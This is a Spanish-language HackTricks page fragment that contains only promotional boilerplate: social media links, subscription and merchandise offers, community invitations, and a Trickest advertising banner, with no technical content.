<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** con las herramientas comunitarias m√°s avanzadas del mundo.\
Obt√©n acceso hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
